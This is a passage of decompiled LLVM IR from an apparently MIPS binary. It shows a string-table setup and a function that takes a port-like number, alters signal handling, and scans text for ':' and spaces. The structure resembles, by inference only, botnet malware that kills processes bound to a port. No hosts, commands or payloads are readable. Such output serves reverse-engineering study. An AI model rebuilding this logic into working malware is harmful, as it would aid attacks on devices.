  %v4_4009ac = call i32 @function_40061c(i32 27, i32 16, i32 ptrtoint (i32* @global_var_408424.45 to i32))
  %v3_4009c0 = load i32, i32* @global_var_449b5c.20, align 4
  store i32 %v3_4009c0, i32* @t9, align 4
  %v4_4009c8 = call i32 @function_40061c(i32 28, i32 16, i32 ptrtoint (i32* @global_var_408438.46 to i32))
  %v3_4009dc = load i32, i32* @global_var_449b5c.20, align 4
  store i32 %v3_4009dc, i32* @t9, align 4
  %v5_4009e4 = call i32 @function_40061c(i32 29, i32 50, i32 ptrtoint ([51 x i8]* @global_var_40844c.47 to i32))
  %v3_4009f8 = load i32, i32* @global_var_449b5c.20, align 4
  store i32 %v3_4009f8, i32* @t9, align 4
  %v8_400a08 = call i32 @function_40061c(i32 30, i32 52, i32 ptrtoint ([53 x i8]* @global_var_408480.48 to i32))
  %v1_400a18 = load i32, i32* @t9, align 4
  %v1_400a1c = add i32 %v1_400a18, 299204
  %v2_400a1c = inttoptr i32 %v1_400a1c to i32*
  %v3_400a1c = load i32, i32* %v2_400a1c, align 4
  %v1_400a20 = add i32 %v1_400a18, 299408
  %v2_400a20 = inttoptr i32 %v1_400a20 to i32*
  %v3_400a20 = load i32, i32* %v2_400a20, align 4
  call void @__pseudo_branch(i32 %v3_400a20)
  ret i32 %v3_400a1c

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @function_40061c, { 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 1, 0, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
}

define i32 @function_400a30(i32 %arg1) local_unnamed_addr {
dec_label_pc_400a30:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %fp.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %s4.global-to-local = alloca i32, align 4
  %s5.global-to-local = alloca i32, align 4
  %s6.global-to-local = alloca i32, align 4
  %t9.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %tmp37 = alloca i32, align 4
  %tmp38 = alloca i32, align 4
  %tmp39 = alloca i32, align 4
  %tmp40 = alloca i32, align 4
  %tmp41 = alloca i8, align 1
  store i32 0, i32* %s5.global-to-local, align 4
  %v1_400a38 = load i32, i32* @t9, align 4
  %v3_400a6c = load i32, i32* @global_var_449b30.49, align 4
  store i32 %v3_400a6c, i32* %t9.global-to-local, align 4
  %v1_400a70 = urem i32 %arg1, 65536
  store i32 %v1_400a70, i32* %s1.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  %v2_400a78 = ptrtoint i32* %tmp37 to i32
  store i32 %v2_400a78, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400a6c)
  %v2_400a88 = ptrtoint i32* %tmp38 to i32
  store i32 %v2_400a88, i32* %a0.global-to-local, align 4
  %v3_400a8c = load i32, i32* @global_var_449b30.49, align 4
  store i32 %v3_400a8c, i32* %t9.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400a8c)
  %v2_400aa0 = ptrtoint i32* %tmp39 to i32
  store i32 %v2_400aa0, i32* %a0.global-to-local, align 4
  %v3_400aa4 = load i32, i32* @global_var_449b30.49, align 4
  store i32 %v3_400aa4, i32* %t9.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400aa4)
  %v2_400ab8 = ptrtoint i32* %tmp40 to i32
  store i32 %v2_400ab8, i32* %a0.global-to-local, align 4
  %v3_400abc = load i32, i32* @global_var_449b30.49, align 4
  store i32 %v3_400abc, i32* %t9.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400abc)
  %v2_400ad0 = ptrtoint i8* %tmp41 to i32
  store i32 %v2_400ad0, i32* %s0.global-to-local, align 4
  %v3_400ad4 = load i32, i32* @global_var_449afc.50, align 4
  store i32 %v3_400ad4, i32* %t9.global-to-local, align 4
  %v0_400ad8 = load i32, i32* %s1.global-to-local, align 4
  store i32 %v0_400ad8, i32* %a0.global-to-local, align 4
  store i32 16, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400ad4)
  %v3_400af0 = load i32, i32* @global_var_449b8c.51, align 4
  store i32 %v3_400af0, i32* %t9.global-to-local, align 4
  store i32 %v2_400ad0, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400af0)
  store i32 2, i32* %v1.global-to-local, align 4
  %v0_400b08 = load i32, i32* @v0, align 4
  %v2_400b08 = icmp eq i32 %v0_400b08, 2
  store i32 48, i32* %v0.global-to-local, align 4
  br i1 %v2_400b08, label %dec_label_pc_400b0c, label %dec_label_pc_400b30

dec_label_pc_400b0c:                              ; preds = %dec_label_pc_400a30
  store i32 0, i32* %v1.global-to-local, align 4
  store i8 48, i8* %tmp41, align 1
  br label %dec_label_pc_400b30

dec_label_pc_400b30:                              ; preds = %dec_label_pc_400a30, %dec_label_pc_400b0c
  %v3_400b30 = load i32, i32* @global_var_449b08.52, align 4
  store i32 %v3_400b30, i32* %t9.global-to-local, align 4
  store i32 3, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400b30)
  %v3_400b48 = load i32, i32* @global_var_449b08.52, align 4
  store i32 %v3_400b48, i32* %t9.global-to-local, align 4
  store i32 5, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400b48)
  %v3_400b60 = load i32, i32* @global_var_449b08.52, align 4
  store i32 %v3_400b60, i32* %t9.global-to-local, align 4
  store i32 7, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400b60)
  %v3_400b78 = load i32, i32* @global_var_449b08.52, align 4
  store i32 %v3_400b78, i32* %t9.global-to-local, align 4
  store i32 6, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400b78)
  %v3_400b90 = load i32, i32* @global_var_449c30.53, align 4
  store i32 %v3_400b90, i32* %t9.global-to-local, align 4
  store i32 6, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400b90)
  %v0_400ba4 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_400ba4, i32* %a0.global-to-local, align 4
  %v3_400ba8 = load i32, i32* @global_var_449a9c.55, align 4
  store i32 %v3_400ba8, i32* %t9.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400ba8)
  %v0_400bb8 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_400bb8, i32* %s2.global-to-local, align 4
  %v2_400bc4 = icmp eq i32 %v0_400bb8, -1
  store i32 0, i32* %v0.global-to-local, align 4
  br i1 %v2_400bc4, label %dec_label_pc_400b30.dec_label_pc_400bd4_crit_edge, label %dec_label_pc_400d70

dec_label_pc_400b30.dec_label_pc_400bd4_crit_edge: ; preds = %dec_label_pc_400b30
  %v1_400bd8.pre.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_400bd4

dec_label_pc_400bd4:                              ; preds = %dec_label_pc_400b30.dec_label_pc_400bd4_crit_edge, %dec_label_pc_400d70
  %v1_400bd8.pre = phi i32 [ %v1_400bd8.pre.pre, %dec_label_pc_400b30.dec_label_pc_400bd4_crit_edge ], [ 0, %dec_label_pc_400d70 ]
  store i32 %v2_400aa0, i32* %a1.global-to-local, align 4
  br label %dec_label_pc_400bd8

dec_label_pc_400bd8:                              ; preds = %dec_label_pc_400be8, %dec_label_pc_400bd4
  %v3_400bec = phi i32 [ %v4_400bec, %dec_label_pc_400be8 ], [ %v1_400bd8.pre, %dec_label_pc_400bd4 ]
  %v2_400bd8 = add i32 %v3_400bec, %v2_400aa0
  store i32 %v2_400bd8, i32* %v0.global-to-local, align 4
  %v1_400bdc = inttoptr i32 %v2_400bd8 to i8*
  %v2_400bdc = load i8, i8* %v1_400bdc, align 1
  %v3_400bdc = sext i8 %v2_400bdc to i32
  store i32 %v3_400bdc, i32* %a0.global-to-local, align 4
  %v1_400be4 = icmp eq i8 %v2_400bdc, 0
  store i32 58, i32* %v0.global-to-local, align 4
  br i1 %v1_400be4, label %dec_label_pc_400d70, label %dec_label_pc_400be8

dec_label_pc_400be8:                              ; preds = %dec_label_pc_400bd8
  %v2_400bec = icmp eq i8 %v2_400bdc, 58
  %v4_400bec = add i32 %v3_400bec, 1
  store i32 %v4_400bec, i32* %v1.global-to-local, align 4
  br i1 %v2_400bec, label %dec_label_pc_400bf0, label %dec_label_pc_400bd8

dec_label_pc_400bf0:                              ; preds = %dec_label_pc_400be8
  store i32 %v3_400bec, i32* %v1.global-to-local, align 4
  %v1_400bf8 = add i32 %v3_400bec, 2
  store i32 %v1_400bf8, i32* %a0.global-to-local, align 4
  %v2_400bfc = add i32 %v1_400bf8, %v2_400aa0
  store i32 %v2_400bfc, i32* %v0.global-to-local, align 4
  store i32 %v1_400bf8, i32* %s1.global-to-local, align 4
  store i32 32, i32* %a1.global-to-local, align 4
  br label %dec_label_pc_400c08

dec_label_pc_400c08:                              ; preds = %dec_label_pc_400c14, %dec_label_pc_400bf0
  %v3_400c18 = phi i32 [ %v4_400c18, %dec_label_pc_400c14 ], [ %v1_400bf8, %dec_label_pc_400bf0 ]
  %v0_400c08 = phi i32 [ %v3_400c10, %dec_label_pc_400c14 ], [ %v2_400bfc, %dec_label_pc_400bf0 ]
  %v1_400c08 = inttoptr i32 %v0_400c08 to i8*
  %v2_400c08 = load i8, i8* %v1_400c08, align 1
  %v3_400c08 = sext i8 %v2_400c08 to i32
  store i32 %v3_400c08, i32* %v1.global-to-local, align 4
  %v1_400c10 = icmp eq i8 %v2_400c08, 0
  %v3_400c10 = add i32 %v0_400c08, 1
  store i32 %v3_400c10, i32* %v0.global-to-local, align 4
  br i1 %v1_400c10, label %dec_label_pc_400c24, label %dec_label_pc_400c14

dec_label_pc_400c14:                              ; preds = %dec_label_pc_400c08
  %v2_400c18 = icmp eq i8 %v2_400c08, 32
  %v4_400c18 = add i32 %v3_400c18, 1
  store i32 %v4_400c18, i32* %s1.global-to-local, align 4
  br i1 %v2_400c18, label %dec_label_pc_400c1c, label %dec_label_pc_400c08

dec_label_pc_400c1c:                              ; preds = %dec_label_pc_400c14
  store i32 %v3_400c18, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_400c24

dec_label_pc_400c24:                              ; preds = %dec_label_pc_400c08, %dec_label_pc_400c1c
  %v3_400c28 = load i32, i32* @global_var_449b8c.51, align 4
  store i32 %v3_400c28, i32* %t9.global-to-local, align 4
  store i32 %v2_400bfc, i32* %s0.global-to-local, align 4
  %v0_400c30 = load i32, i32* @sp, align 4
  %v2_400c30 = add i32 %v0_400c30, %v3_400c18
  store i32 %v2_400c30, i32* %v0.global-to-local, align 4
  store i32 %v2_400bfc, i32* %a0.global-to-local, align 4
  %v2_400c38 = add i32 %v2_400c30, 56
  %v3_400c38 = inttoptr i32 %v2_400c38 to i8*
  store i8 0, i8* %v3_400c38, align 1
  call void @__pseudo_call(i32 %v3_400c28)
  %v0_400c44 = load i32, i32* %s0.global-to-local, align 4
  store i32 %v0_400c44, i32* %a0.global-to-local, align 4
  %v3_400c48 = load i32, i32* @global_var_449c54.57, align 4
  store i32 %v3_400c48, i32* %t9.global-to-local, align 4
  %v0_400c4c = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_400c4c, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400c48)
  store i32 -1, i32* %v1.global-to-local, align 4
  %v0_400c60 = load i32, i32* %v0.global-to-local, align 4
  %v2_400c60 = icmp eq i32 %v0_400c60, -1
  br i1 %v2_400c60, label %dec_label_pc_400d70, label %dec_label_pc_400c64

dec_label_pc_400c64:                              ; preds = %dec_label_pc_400c24
  %v3_400c60 = load i32, i32* %s1.global-to-local, align 4
  %v4_400c60 = add i32 %v3_400c60, 1
  br label %dec_label_pc_400c74

dec_label_pc_400c74:                              ; preds = %dec_label_pc_400cdc, %dec_label_pc_400c64
  %v0_400cf417 = phi i32 [ %v0_400cf418, %dec_label_pc_400cdc ], [ 0, %dec_label_pc_400c64 ]
  %v0_400cc413 = phi i32 [ %v0_400cc414, %dec_label_pc_400cdc ], [ 0, %dec_label_pc_400c64 ]
  %v2_400cec = phi i32 [ %v3_400cec, %dec_label_pc_400cdc ], [ %v4_400c60, %dec_label_pc_400c64 ]
  %v0_400c80 = phi i32 [ %v3_400ce4, %dec_label_pc_400cdc ], [ -1, %dec_label_pc_400c64 ]
  %v2_400c78 = icmp eq i32 %v0_400c80, 32
  store i32 9, i32* %v0.global-to-local, align 4
  br i1 %v2_400c78, label %dec_label_pc_400cc0, label %dec_label_pc_400c7c

dec_label_pc_400c7c:                              ; preds = %dec_label_pc_400c74
  %v2_400c80 = icmp eq i32 %v0_400c80, 9
  store i32 1, i32* %v0.global-to-local, align 4
  br i1 %v2_400c80, label %dec_label_pc_400cc0, label %dec_label_pc_400c84

dec_label_pc_400c84:                              ; preds = %dec_label_pc_400c7c
  %v0_400c88 = load i32, i32* %a1.global-to-local, align 4
  %v2_400c88 = icmp eq i32 %v0_400c88, 1
  br i1 %v2_400c88, label %dec_label_pc_400c8c, label %dec_label_pc_400cb8

dec_label_pc_400c8c:                              ; preds = %dec_label_pc_400c84
  %v1_400c90 = add i32 %v0_400cc413, 1
  %v2_400c94 = icmp eq i32 %v0_400cc413, 0
  store i32 0, i32* %a1.global-to-local, align 4
  br i1 %v2_400c94, label %dec_label_pc_400c98, label %dec_label_pc_400cc4

dec_label_pc_400c98:                              ; preds = %dec_label_pc_400c8c
  %v0_400c9c = load i32, i32* @sp, align 4
  %v2_400c9c = add i32 %v0_400c9c, %v2_400cec
  store i32 %v2_400c9c, i32* %v0.global-to-local, align 4
  %v1_400ca0 = add i32 %v2_400c9c, 57
  %v2_400ca0 = inttoptr i32 %v1_400ca0 to i8*
  %v3_400ca0 = load i8, i8* %v2_400ca0, align 1
  %v4_400ca0 = sext i8 %v3_400ca0 to i32
  store i32 %v4_400ca0, i32* %v1.global-to-local, align 4
  %v2_400ca8 = icmp eq i8 %v3_400ca0, 65
  store i32 %v2_400c9c, i32* %v0.global-to-local, align 4
  br i1 %v2_400ca8, label %dec_label_pc_400cac, label %dec_label_pc_400cdc

dec_label_pc_400cac:                              ; preds = %dec_label_pc_400c98
  br label %dec_label_pc_400cb8

dec_label_pc_400cb8:                              ; preds = %dec_label_pc_400c84, %dec_label_pc_400cac
  %v0_400cf422 = phi i32 [ %v0_400cf417, %dec_label_pc_400c84 ], [ 1, %dec_label_pc_400cac ]
  %v0_400cc411 = phi i32 [ %v0_400cc413, %dec_label_pc_400c84 ], [ 1, %dec_label_pc_400cac ]
  store i32 0, i32* %a1.global-to-local, align 4
  br label %dec_label_pc_400cc0

dec_label_pc_400cc0:                              ; preds = %dec_label_pc_400c7c, %dec_label_pc_400c74, %dec_label_pc_400cb8
  %v0_400cf421 = phi i32 [ %v0_400cf417, %dec_label_pc_400c7c ], [ %v0_400cf417, %dec_label_pc_400c74 ], [ %v0_400cf422, %dec_label_pc_400cb8 ]
  %v0_400cc412 = phi i32 [ %v0_400cc413, %dec_label_pc_400c7c ], [ %v0_400cc413, %dec_label_pc_400c74 ], [ %v0_400cc411, %dec_label_pc_400cb8 ]
  store i32 1, i32* %a1.global-to-local, align 4
  br label %dec_label_pc_400cc4

dec_label_pc_400cc4:                              ; preds = %dec_label_pc_400c8c, %dec_label_pc_400cc0
  %v0_400cf420 = phi i32 [ %v0_400cf417, %dec_label_pc_400c8c ], [ %v0_400cf421, %dec_label_pc_400cc0 ]
  %v0_400cc4 = phi i32 [ %v1_400c90, %dec_label_pc_400c8c ], [ %v0_400cc412, %dec_label_pc_400cc0 ]
  %v1_400cc4 = icmp slt i32 %v0_400cc4, 7
  %v2_400cc4 = zext i1 %v1_400cc4 to i32
  store i32 %v2_400cc4, i32* %v0.global-to-local, align 4
  %v1_400cc8 = icmp eq i1 %v1_400cc4, false
  %v2_400cc8 = load i32, i32* %a0.global-to-local, align 4
  %v3_400cc8 = add i32 %v2_400cc8, 1
  store i32 %v3_400cc8, i32* %a0.global-to-local, align 4
  br i1 %v1_400cc8, label %dec_label_pc_400cf4, label %dec_label_pc_400ccc

dec_label_pc_400ccc:                              ; preds = %dec_label_pc_400cc4
  %v0_400cd8 = load i32, i32* @sp, align 4
  %v2_400cd8 = add i32 %v0_400cd8, %v2_400cec
  store i32 %v2_400cd8, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_400cdc

dec_label_pc_400cdc:                              ; preds = %dec_label_pc_400c98, %dec_label_pc_400ccc
  %v0_400cf418 = phi i32 [ %v0_400cf417, %dec_label_pc_400c98 ], [ %v0_400cf420, %dec_label_pc_400ccc ]
  %v0_400cdc = phi i32 [ %v2_400c9c, %dec_label_pc_400c98 ], [ %v2_400cd8, %dec_label_pc_400ccc ]
  %v0_400cc414 = phi i32 [ 1, %dec_label_pc_400c98 ], [ %v0_400cc4, %dec_label_pc_400ccc ]
  %v1_400cdc = add i32 %v0_400cdc, 57
  store i32 %v1_400cdc, i32* %a0.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  %v1_400ce4 = inttoptr i32 %v1_400cdc to i8*
  %v2_400ce4 = load i8, i8* %v1_400ce4, align 1
  %v3_400ce4 = sext i8 %v2_400ce4 to i32
  store i32 %v3_400ce4, i32* %v1.global-to-local, align 4
  %v1_400cec = icmp eq i8 %v2_400ce4, 0
  %v3_400cec = add i32 %v2_400cec, 1
  br i1 %v1_400cec, label %dec_label_pc_400cf4, label %dec_label_pc_400c74

dec_label_pc_400cf4:                              ; preds = %dec_label_pc_400cdc, %dec_label_pc_400cc4
  %v1_400d2c = phi i32 [ %v3_400cec, %dec_label_pc_400cdc ], [ %v2_400cec, %dec_label_pc_400cc4 ]
  %v0_400cf4 = phi i32 [ %v0_400cf418, %dec_label_pc_400cdc ], [ %v0_400cf420, %dec_label_pc_400cc4 ]
  %v1_400cf4 = icmp eq i32 %v0_400cf4, 0
  store i32 %v1_400d2c, i32* %a0.global-to-local, align 4
  br i1 %v1_400cf4, label %dec_label_pc_400d70, label %dec_label_pc_400cf8

dec_label_pc_400cf8:                              ; preds = %dec_label_pc_400cf4
  %v2_400d00 = add i32 %v1_400d2c, %v2_400aa0
  store i32 %v2_400d00, i32* %v0.global-to-local, align 4
  store i32 32, i32* %a1.global-to-local, align 4
  br label %dec_label_pc_400d08

dec_label_pc_400d08:                              ; preds = %dec_label_pc_400d14, %dec_label_pc_400cf8
  %v3_400d18 = phi i32 [ %v4_400d18, %dec_label_pc_400d14 ], [ %v1_400d2c, %dec_label_pc_400cf8 ]
  %v0_400d08 = phi i32 [ %v3_400d10, %dec_label_pc_400d14 ], [ %v2_400d00, %dec_label_pc_400cf8 ]
  %v1_400d08 = inttoptr i32 %v0_400d08 to i8*
  %v2_400d08 = load i8, i8* %v1_400d08, align 1
  %v3_400d08 = sext i8 %v2_400d08 to i32
  store i32 %v3_400d08, i32* %v1.global-to-local, align 4
  %v1_400d10 = icmp eq i8 %v2_400d08, 0
  %v3_400d10 = add i32 %v0_400d08, 1
  store i32 %v3_400d10, i32* %v0.global-to-local, align 4
  br i1 %v1_400d10, label %dec_label_pc_400d24, label %dec_label_pc_400d14

dec_label_pc_400d14:                              ; preds = %dec_label_pc_400d08
  %v2_400d18 = icmp eq i8 %v2_400d08, 32
  %v4_400d18 = add i32 %v3_400d18, 1
  br i1 %v2_400d18, label %dec_label_pc_400d1c, label %dec_label_pc_400d08

dec_label_pc_400d1c:                              ; preds = %dec_label_pc_400d14
  br label %dec_label_pc_400d24

dec_label_pc_400d24:                              ; preds = %dec_label_pc_400d08, %dec_label_pc_400d1c
  store i32 %v2_400ab8, i32* %s1.global-to-local, align 4
  store i32 %v2_400d00, i32* %s0.global-to-local, align 4
  %v3_400d30 = load i32, i32* @global_var_449b8c.51, align 4
  store i32 %v3_400d30, i32* %t9.global-to-local, align 4
  %v2_400d34 = add i32 %v3_400d18, %v2_400ab8
  store i32 %v2_400d34, i32* %v0.global-to-local, align 4
  %v1_400d38 = add i32 %v2_400d34, 32
  %v2_400d38 = inttoptr i32 %v1_400d38 to i8*
  store i8 0, i8* %v2_400d38, align 1
  %v1_400d3c = load i32, i32* %s0.global-to-local, align 4
  store i32 %v1_400d3c, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400d30)
  %v0_400d44 = load i32, i32* %v0.global-to-local, align 4
  %v1_400d44 = icmp slt i32 %v0_400d44, 16
  %v2_400d44 = zext i1 %v1_400d44 to i32
  store i32 %v2_400d44, i32* %v0.global-to-local, align 4
  %v1_400d4c = icmp eq i1 %v1_400d44, false
  store i32 %v2_400ab8, i32* %a0.global-to-local, align 4
  br i1 %v1_400d4c, label %dec_label_pc_400d70, label %dec_label_pc_400d50

dec_label_pc_400d50:                              ; preds = %dec_label_pc_400d24
  %v3_400d54 = load i32, i32* @global_var_449ac8.59, align 4
  store i32 %v3_400d54, i32* %t9.global-to-local, align 4
  %v1_400d5c = load i32, i32* %s0.global-to-local, align 4
  store i32 %v1_400d5c, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400d54)
  br label %dec_label_pc_400d70

dec_label_pc_400d70:                              ; preds = %dec_label_pc_400bd8, %dec_label_pc_400b30, %dec_label_pc_400d24, %dec_label_pc_400cf4, %dec_label_pc_400c24, %dec_label_pc_400d50
  %v1_400d70 = add i32 %v1_400a38, 299508
  %v2_400d70 = inttoptr i32 %v1_400d70 to i32*
  %v3_400d70 = load i32, i32* %v2_400d70, align 4
  store i32 %v3_400d70, i32* %t9.global-to-local, align 4
  store i32 %v2_400aa0, i32* %a0.global-to-local, align 4
  store i32 512, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400d70)
  %v0_400d88 = load i32, i32* %v0.global-to-local, align 4
  %v1_400d88 = icmp eq i32 %v0_400d88, 0
  store i32 0, i32* %v1.global-to-local, align 4
  br i1 %v1_400d88, label %dec_label_pc_400d8c, label %dec_label_pc_400bd4

dec_label_pc_400d8c:                              ; preds = %dec_label_pc_400d70
  %v3_400d90 = load i32, i32* @global_var_449a6c.60, align 4
  store i32 %v3_400d90, i32* %t9.global-to-local, align 4
  %v1_400d98 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v1_400d98, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400d90)
  %v3_400da8 = load i32, i32* @global_var_449b8c.51, align 4
  store i32 %v3_400da8, i32* %t9.global-to-local, align 4
  store i32 %v2_400ab8, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400da8)
  %v0_400dbc = load i32, i32* %v0.global-to-local, align 4
  %v1_400dbc = icmp eq i32 %v0_400dbc, 0
  br i1 %v1_400dbc, label %dec_label_pc_400dc0, label %dec_label_pc_400e28

dec_label_pc_400dc0:                              ; preds = %dec_label_pc_400d8c
  %v3_400dc4 = load i32, i32* @global_var_449bb8.61, align 4
  store i32 %v3_400dc4, i32* %t9.global-to-local, align 4
  store i32 3, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400dc4)
  %v3_400ddc = load i32, i32* @global_var_449bb8.61, align 4
  store i32 %v3_400ddc, i32* %t9.global-to-local, align 4
  store i32 5, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400ddc)
  %v3_400df4 = load i32, i32* @global_var_449bb8.61, align 4
  store i32 %v3_400df4, i32* %t9.global-to-local, align 4
  store i32 7, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400df4)
  %v3_400e0c = load i32, i32* @global_var_449bb8.61, align 4
  store i32 %v3_400e0c, i32* %t9.global-to-local, align 4
  store i32 6, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400e0c)
  store i32 0, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_400e28

dec_label_pc_400e28:                              ; preds = %dec_label_pc_400d8c, %dec_label_pc_400dc0
  %v3_400e28 = load i32, i32* @global_var_449c30.53, align 4
  store i32 %v3_400e28, i32* %t9.global-to-local, align 4
  store i32 3, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400e28)
  %v3_400e40 = load i32, i32* @global_var_449b14.62, align 4
  store i32 %v3_400e40, i32* %t9.global-to-local, align 4
  %v1_400e48 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v1_400e48, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400e40)
  %v0_400e54 = load i32, i32* %v0.global-to-local, align 4
  %v1_400e54 = icmp eq i32 %v0_400e54, 0
  store i32 %v0_400e54, i32* %s6.global-to-local, align 4
  br i1 %v1_400e54, label %dec_label_pc_400e58, label %dec_label_pc_400e64

dec_label_pc_400e58:                              ; preds = %dec_label_pc_400e28
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_400e64

dec_label_pc_400e64:                              ; preds = %dec_label_pc_400e28, %dec_label_pc_400e58
  store i32 0, i32* %fp.global-to-local, align 4
  %v0_400e6c.pre = load i32, i32* %a0.global-to-local, align 4
  %v1_401210 = add i32 %v1_400a38, 299448
  %v2_401210 = inttoptr i32 %v1_401210 to i32*
  br label %dec_label_pc_400e6c

dec_label_pc_400e6c:                              ; preds = %dec_label_pc_401210, %dec_label_pc_400e64
  %v2_400e80 = phi i32 [ %v0_401224, %dec_label_pc_401210 ], [ %v0_400e6c.pre, %dec_label_pc_400e64 ]
  %v1_400e6c = add i32 %v2_400e80, 11
  %v2_400e6c = inttoptr i32 %v1_400e6c to i8*
  %v3_400e6c = load i8, i8* %v2_400e6c, align 1
  %v4_400e6c = zext i8 %v3_400e6c to i32
  %v1_400e74 = add nuw nsw i32 %v4_400e6c, 208
  %v1_400e78 = and i32 %v1_400e74, 254
  %v1_400e7c = icmp ult i32 %v1_400e78, 10
  %v2_400e7c = zext i1 %v1_400e7c to i32
  store i32 %v2_400e7c, i32* %v0.global-to-local, align 4
  %v1_400e80 = icmp eq i1 %v1_400e7c, false
  store i32 %v1_400e6c, i32* %s4.global-to-local, align 4
  br i1 %v1_400e80, label %dec_label_pc_401210, label %dec_label_pc_400e84

dec_label_pc_400e84:                              ; preds = %dec_label_pc_400e6c
  %v3_400e88 = load i32, i32* @global_var_449c30.53, align 4
  store i32 %v3_400e88, i32* %t9.global-to-local, align 4
  store i32 3, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400e88)
  store i32 %v2_400a78, i32* %s1.global-to-local, align 4
  %v3_400ea0 = load i32, i32* @global_var_449ac8.59, align 4
  store i32 %v3_400ea0, i32* %t9.global-to-local, align 4
  %v0_400ea4 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_400ea4, i32* %a1.global-to-local, align 4
  store i32 %v2_400a78, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400ea0)
  %v3_400eb8 = load i32, i32* @global_var_449b8c.51, align 4
  store i32 %v3_400eb8, i32* %t9.global-to-local, align 4
  store i32 %v2_400a78, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400eb8)
  %v0_400ecc = load i32, i32* %s4.global-to-local, align 4
  store i32 %v0_400ecc, i32* %a1.global-to-local, align 4
  %v3_400ed0 = load i32, i32* @global_var_449ac8.59, align 4
  store i32 %v3_400ed0, i32* %t9.global-to-local, align 4
  %v1_400ed8 = load i32, i32* %s1.global-to-local, align 4
  %v2_400ed8 = load i32, i32* %v0.global-to-local, align 4
  %v3_400ed8 = add i32 %v2_400ed8, %v1_400ed8
  store i32 %v3_400ed8, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400ed0)
  %v3_400ee8 = load i32, i32* @global_var_449b8c.51, align 4
  store i32 %v3_400ee8, i32* %t9.global-to-local, align 4
  store i32 %v2_400a78, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400ee8)
  store i32 5, i32* %a0.global-to-local, align 4
  %v3_400f00 = load i32, i32* @global_var_449c30.53, align 4
  store i32 %v3_400f00, i32* %t9.global-to-local, align 4
  %v1_400f08 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v1_400f08, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400f00)
  %v0_400f14 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_400f14, i32* %a1.global-to-local, align 4
  %v3_400f18 = load i32, i32* @global_var_449ac8.59, align 4
  store i32 %v3_400f18, i32* %t9.global-to-local, align 4
  %v1_400f20 = load i32, i32* %s1.global-to-local, align 4
  %v2_400f20 = load i32, i32* %s0.global-to-local, align 4
  %v3_400f20 = add i32 %v2_400f20, %v1_400f20
  store i32 %v3_400f20, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400f18)
  store i32 %v2_400a78, i32* %a0.global-to-local, align 4
  %v3_400f30 = load i32, i32* @global_var_449c14.65, align 4
  store i32 %v3_400f30, i32* %t9.global-to-local, align 4
  store i32 %v2_400a88, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400f30)
  store i32 -1, i32* %v1.global-to-local, align 4
  %v0_400f48 = load i32, i32* %v0.global-to-local, align 4
  %v2_400f48 = icmp eq i32 %v0_400f48, -1
  br i1 %v2_400f48, label %dec_label_pc_401210, label %dec_label_pc_400f4c

dec_label_pc_400f4c:                              ; preds = %dec_label_pc_400e84
  %v3_400f50 = load i32, i32* @global_var_449c30.53, align 4
  store i32 %v3_400f50, i32* %t9.global-to-local, align 4
  store i32 3, i32* %a0.global-to-local, align 4
